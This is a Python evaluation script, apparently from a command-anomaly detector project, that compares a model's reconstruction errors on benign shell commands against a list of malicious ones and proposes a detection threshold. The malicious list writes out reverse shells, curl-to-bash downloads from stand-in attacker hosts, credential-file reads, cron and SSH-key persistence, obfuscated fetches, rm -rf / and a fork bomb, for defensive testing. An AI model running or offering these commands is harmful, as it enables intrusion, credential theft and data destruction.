
import sys
import os
import numpy as np

# Add src to path
sys.path.append(os.path.abspath(os.path.join(os.getcwd(), 'src')))

try:
    from cyanide.ml.pipeline import CyanideML
except ImportError:
    # Fallback if running from scripts dir
    sys.path.append(os.path.abspath(os.path.join(os.getcwd(), '../src')))
    from cyanide.ml.pipeline import CyanideML

def analyze():
    print("[*] Loading Pipeline...")
    try:
        pipeline = CyanideML("ai_models/cyanideML")
    except Exception as e:
        print(f"[!] Failed to load pipeline: {e}")
        return

    # Data
    clean_commands = [
        "ls", "pwd", "cd", "echo", "cat", "whoami", "date", "hostname",
        "cd /tmp", "cd ..", "ls -la", "ls -lh /var/log",
        "cat file.txt", "less document.md", "head -n 10 log.txt",
        "ps aux", "top", "df -h", "free -m", "uptime",
        "ping 8.8.8.8", "netstat -tulpn", "ifconfig", "ip addr",
        "vim /etc/hosts", "nano config.cfg", "grep -r 'todo' .",
        "mkdir new_folder", "rm old_file.txt", "mv a b", "cp x y",
        "chmod 644 file", "chown user:user file", "tar -czf archive.tar.gz folder",
        "zip -r archive.zip folder", "unzip archive.zip", "git status",
        "git pull", "git push", "docker ps", "docker images",
        "kubectl get pods", "service nginx status", "systemctl status sshd"
    ]

    malicious_commands = [
        "wget http://malware.com/payload.sh",
        "curl -O http://attacker.com/script.sh && bash script.sh",
        "curl -s http://evil.com | bash",
        "wget -qO- http://malware.net/miner | sh",
        "nc -e /bin/sh attacker.com 4444",
        "bash -i >& /dev/tcp/1.2.3.4/8080 0>&1",
        "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
        "sudo su -", "sudo -s", "chmod 4755 /bin/bash",
        "find / -perm -4000 2>/dev/null",
        "cat /etc/shadow", "cat /root/.ssh/id_rsa",
        "grep password /var/log/*", "history | grep pass",
        "cat /etc/passwd", "uname -a && cat /proc/version",
        "find / -name \"*.conf\" 2>/dev/null", "netstat -antp",
        "echo \"* * * * * /tmp/backdoor\" >> /etc/crontab",
        "(crontab -l; echo \"*/5 * * * * wget evil.com\") | crontab -",
        "echo \"ssh-rsa AAAA...\" >> /root/.ssh/authorized_keys",
        "echo \"d2dldCBodHRwOi8vbWFsd2FyZS5jb20=\" | base64 -d | bash",
        "$(echo 'curl evil.com' | rev)", "w\\ge\\t http://malware.com",
        "rm -rf / --no-preserve-root", ":(){ :|:& };:"
    ]

    print(f"[*] Analyzing {len(clean_commands)} clean and {len(malicious_commands)} malicious commands...")

    clean_errors = []
    for cmd in clean_commands:
        error = pipeline.anomaly_detector.get_reconstruction_error(
            pipeline.anomaly_detector.preprocess(cmd)
        )
        clean_errors.append(error)

    malicious_errors = []
    for cmd in malicious_commands:
        error = pipeline.anomaly_detector.get_reconstruction_error(
            pipeline.anomaly_detector.preprocess(cmd)
        )
        malicious_errors.append(error)
    
    # Stats
    clean_mean = np.mean(clean_errors)
    clean_std = np.std(clean_errors)
    clean_p95 = np.percentile(clean_errors, 95)
    clean_p5 = np.percentile(clean_errors, 5)
    
    mal_mean = np.mean(malicious_errors)
    mal_std = np.std(malicious_errors)
    mal_p95 = np.percentile(malicious_errors, 95)
    mal_p5 = np.percentile(malicious_errors, 5)

    print("\n=== RESULTS ===")
    print("Clean commands:")
    print(f"  Mean error: {clean_mean:.4f}")
    print(f"  Std: {clean_std:.4f}")
    print(f"  Range: [{min(clean_errors):.4f}, {max(clean_errors):.4f}]")
    print(f"  95th percentile: {clean_p95:.4f}")
    print(f"  5th percentile:  {clean_p5:.4f}")

    print("\nMalicious commands:")
    print(f"  Mean error: {mal_mean:.4f}")
    print(f"  Std: {mal_std:.4f}")
    print(f"  Range: [{min(malicious_errors):.4f}, {max(malicious_errors):.4f}]")
    print(f"  95th percentile: {mal_p95:.4f}")
    print(f"  5th percentile:  {mal_p5:.4f}")
    
    # Logic Analysis
    if mal_mean < clean_mean:
        print("\n[!] LOGIC CHECK: Malicious error is LOWER than Clean error.")
        print("    -> Conclusion: Model is trained on Attacks. INVERTED LOGIC REQUIRED.")
        
        # Proposed threshold: between Malicious P95 and Clean P5?
        # Malicious are LOW error. Clean are HIGH error.
        # Anomaly = Error < Threshold
        # Threshold should be above Malicious P95 or around Clean P5?
        
        # Let's find simple midpoint between means
        pass
        
        # Or better: Max of Malicious to capture all?
        max_mal = max(malicious_errors)
        min_clean = min(clean_errors)
        
        print(f"    -> Max Malicious Error: {max_mal:.4f}")
        print(f"    -> Min Clean Error:     {min_clean:.4f}")
        
        if max_mal < min_clean:
             recommended = (max_mal + min_clean) / 2
             print(f"    -> PERFECT SEPARATION POSSIBLE at {recommended:.4f}")
        else:
             print("    -> Overlap detected.")
             recommended = max_mal * 1.05 # Add margin to catch all attacks?
             print(f"    -> Recommended Threshold (High Recall): {recommended:.4f}")
             
    else:
        print("\n[+] LOGIC CHECK: Malicious error is HIGHER than Clean error.")
        print("    -> Conclusion: Standard logic applies.")
        
    print(f"\nCurrent Model Threshold: {pipeline.anomaly_detector.threshold}")

if __name__ == "__main__":
    analyze()
